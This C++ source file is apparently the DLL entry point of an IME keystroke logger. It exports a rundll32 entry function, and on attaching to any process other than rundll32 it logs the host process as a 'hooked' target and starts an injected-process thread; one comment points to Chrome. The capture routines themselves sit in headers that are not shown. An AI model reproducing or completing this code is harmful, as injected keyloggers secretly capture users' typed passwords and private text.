// dllmain.cpp : 定義 DLL 應用程式的進入點。
#include "pch.h"
#include "util.h"
#include "logger.h"
#include "imeLoggerCore.h"

#include <psapi.h> 

extern "C" __declspec(dllexport) void CALLBACK IMELoggerEntry(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	wchar_t dllPath[MAX_PATH];
	// Initializeing 
	if (DEBUG) {
		DEBUGlogger(L"IMELoggerEntry initializing...\r\n");
	}

	if (!getDLLPath(dllPath)) {
		if (DEBUG)
			DEBUGlogger(L"ExplorerMain | Fail to get DLL path");
		ExitProcess(-1);
	}

	// Register key first
	if (isUserAdmin()) {
		MessageBoxW(NULL, L"IMELoggerEntry Start\r\n ", L"IMELoggerEntry", MB_OK);
	}
	else if (DEBUG) {
		MessageBoxW(NULL, L"Please run as administrator\r\nRun without admin now ", L"IMELoggerEntry", MB_OK);
		exit(-1);
	}

	if (!getDLLPath(dllPath)) {
		if (DEBUG)
			DEBUGlogger(L"ExplorerMain | Fail to get DLL path");
		exit(-1);
	}
	if (DEBUG) {
		DEBUGlogger(L"IMELoggerEntry initialized!\r\n");
	}
	// Initialized

	IMELoggerMain();


	ExitProcess(0);
}

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{

	HANDLE hThread = NULL;
	DWORD threadId = 0;
	HANDLE hProcess = nullptr;
	wchar_t processName[MAX_PATH] = L"<unknown>";
	wchar_t targetProcessName[] = L"rundll32.exe";


	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		initializeLogger();

		hProcess = GetCurrentProcess();
		if (GetModuleBaseNameW(hProcess, NULL, processName, MAX_PATH))
		{
			if (_wcsicmp(processName, targetProcessName) != 0) {
				IMEKeyInputlogger(L"\r\n--------------------\r\nHook new Process:\r\n");
				IMEKeyInputlogger(processName);
				IMEKeyInputlogger(L"\r\n--------------------\r\n");
				// New thread for chromeMain
				hThread = CreateThread(
					NULL,
					0,
					injectedProcessMainThread,
					NULL,
					0,
					&threadId
				);

				if (DEBUG) {
					if (hThread == NULL) {
						// fail to create thread
						MessageBoxW(NULL, L"Fail to create thread\r\n ", L"IMELoggerEntry", MB_OK);
					}
					else {
						// success to create thread
						MessageBoxW(NULL, L"Success to create thread\r\n ", L"IMELoggerEntry", MB_OK);
					}

				}

			}
			else {

			}
		}

		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	case DLL_PROCESS_DETACH:
		IMEKeyInputlogger(L"\r\n");
		Logger::getInstance().closeAll();

		if (hThread != NULL) {
			WaitForSingleObject(hThread, INFINITE);
			CloseHandle(hThread);
			hThread = NULL;
		}

		break;
	}
	return TRUE;
}

